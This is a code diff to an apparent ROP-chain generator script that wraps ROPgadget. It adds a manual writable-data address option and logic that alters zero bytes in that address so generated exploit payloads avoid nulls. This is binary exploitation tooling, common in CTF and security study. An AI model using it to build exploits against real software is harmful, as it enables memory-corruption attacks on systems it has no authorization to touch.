@@ -87,13 +87,31 @@ def main(parser):
                 except:
                     sys.exit('\nROPgadget couldn\'t find necessary gadgets')
         if "Step 5" in line:
-            while '.data' not in line:
-                try:
-                    line = next(rop.stdout)
-                except:
-                    sys.exit('\nROPgadget couldn\'t find necessary gadgets')
-            gadget = line.split(' ')
-            rop_gadgets['stackAddr'] = (gadget[3][:-1], ' '.join(gadget[4:])[2:-1])
+            if parser.data_addr:
+                rop_gadgets['stackAddr'] = (parser.data_addr, '@ .data')
+            else:
+                while '.data' not in line:
+                    try:
+                        line = next(rop.stdout)
+                    except:
+                        sys.exit('\nROPgadget couldn\'t find necessary gadgets')
+                gadget = line.split(' ')
+                rop_gadgets['stackAddr'] = (gadget[3][:-1], ' '.join(gadget[4:])[2:-1])
+
+    # check if .data contains null bytes
+    addr_remove_null = list(rop_gadgets['stackAddr'][0]) 
+    print('addr: ', addr_remove_null, '\n')
+    if (addr_remove_null[-8] == '0' and addr_remove_null[-7] == '0'):
+        addr_remove_null[-7] = '1'
+    if (addr_remove_null[-6] == '0' and addr_remove_null[-5] == '0'):
+        addr_remove_null[-5] = '1'
+    if (addr_remove_null[-4] == '0' and addr_remove_null[-3] == '0'):
+        addr_remove_null[-3] = '1'
+    if (addr_remove_null[-2] == '0' and addr_remove_null[-1] == '0'):
+        addr_remove_null[-1] = '1'
+    addr_remove_null = ''.join(addr_remove_null)
+    rop_gadgets['stackAddr'] = (addr_remove_null, '@ .data')
+    print('addr after: ', addr_remove_null, '\n')
 
     pp.pprint(rop_gadgets)
 
@@ -393,6 +411,8 @@ if __name__ == '__main__':
                         help='Will attempt to automatically run the generated ROPcode in the vulnerable binary')
     parser.add_argument('-p', '--print', required=False, action='store_true',
                         help='Only prints generated ROPchain without any padding')
+    parser.add_argument('-d', '-data', '--data_addr', required=False, action='store', type=str,
+                        help='Manually set the writable data section in hex')
     args = parser.parse_args()
 
     main(args)
